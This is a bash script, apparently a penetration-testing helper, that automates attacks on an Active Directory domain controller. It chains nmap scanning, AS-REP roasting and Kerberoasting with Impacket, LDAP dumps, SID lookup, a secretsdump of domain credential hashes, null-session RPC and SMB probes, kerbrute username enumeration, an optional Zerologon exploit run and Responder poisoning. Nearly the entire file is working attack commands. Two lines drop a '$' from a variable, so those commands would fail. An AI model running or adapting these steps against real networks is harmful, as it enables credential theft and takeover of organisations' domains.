#!/bin/bash

# May need to change location of Impacket, script looks at /home/kali/.local/lib/python3.9/site-packages/impacket/examples/

# Script is used to enumerate AD from the outside, not all questions need answers. At the end you can also type y to run responder, it is up to you to make sure your responder.conf file is correct

echo -e '\E[31;35m' "If Impacket is not within $PATH then you may need to put whole location into script"; tput sgr0

sleep 2 

echo -e '\E[31;35m' "If you do not know all the information below then leave blank"; tput sgr0

sleep 2

echo -e '\E[31;40m' "Domain Name"; tput sgr0

read DOMAIN 

echo -e '\E[31;40m' "Domain IP"; tput sgr0

read DOMAINIP

echo -e '\E[31;40m' "Username"; tput sgr0 

read USER 

echo -e '\E[31;40m' "Password"; tput sgr0

read PASS

echo -e '\E[31;40m' "User File if any"; tput sgr0

read USERFILE

echo -e '\E[31;40m' "Running NMAP on certain ports, putting into $DOMAIN.txt"; tput sgr0

nmap -p 139,445,80,8080,8888,88,111,3389,5985,135,53,593,3269,636 -T4 -vv -Pn -n $DOMAINIP > $DOMAIN.txt

echo -e '\E[31;35m' "Finding Kerberoastable accounts if any"; tput sgr0

GetNPUsers.py DOMAIN/ -no-pass -usersfile $USERFILE -dc-ip $DOMAINIP

sleep 1

echo -e '\E[31;35m' "Trying LDAP domain dump and seeing if ldapsearch works"; tput sgr0

ldapdomaindump ldap://$DOMAINIP:389

ldapsearch -H ldap://$DOMAINIP -x -b "DC=$DOMAIN,DC=local" '(objectclass=person)'; tput sgr0

sleep 1

echo -e '\E[31;35m' "Getting Users SPNs if we can"; tput sgr0

GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DOMAINIP

GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DOMAINIP -request

echo -e '\E[31;35m' "Looking up SID"; tput sgr0

lookupsid.py $DOMAIN/$USER:$PASS@$DOMAINIP

sleep 1

echo -e '\E[31;35m' "Trying to get Secrets Dump"; tput sgr0

secretsdump.py "$DOMAIN/$USER:$PASS@$DOMAINIP" -just-dc

sleep 1

echo -e '\E[31;35m' "Seeing if RPC is open"; tput sgr0

rpcclient -U "" -N DOMAINIP

sleep 1

echo -e '\E[31;40m' "Testing if SMB is open"

smbclient -L \\\\$DOMAINIP\\

sleep 1

echo -e '\E[31;40m' "Kerbrute location ex: (/home/kali/kerbrute/dist/kerbrute_linux_amd64)"; tput sgr0

read KERLOC

echo -e '\E[31;40m' "Kerbrute username file ex: (/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt)"; tput sgr0

read KERUSER

echo -e '\E[31;35m' "Keberos Username Spray"; tput sgr0

$KERLOC userenum $KERUSER --dc $DOMAINIP -d $DOMAIN -t 200

read -p "Test for Zero Logon? (y/n)" answer
if [ $answer = y ] ; then
	echo "Testing if vulnerable to Zero Logon (this may take some time)"; tput sgr0
	echo "Location of zerologon.py? ex: (~/Tools/zerologon.py)"; tput sgr0
	read ZEROLOC
	echo 'SMB Share Name?'; tput sgr0
	read SHARENAME
	python3 $ZEROLOC "$SHARENAME" "$DOMAINIP"
fi

read -p "Do you want to open a new tab for responder? (y/n)" answer
if [ $answer = y ] ; then
	echo "Interface to run responder on ex: (eth1)?" 
	read INT
	xterm -e "sudo responder -I $INT -rdwv;bash"
fi
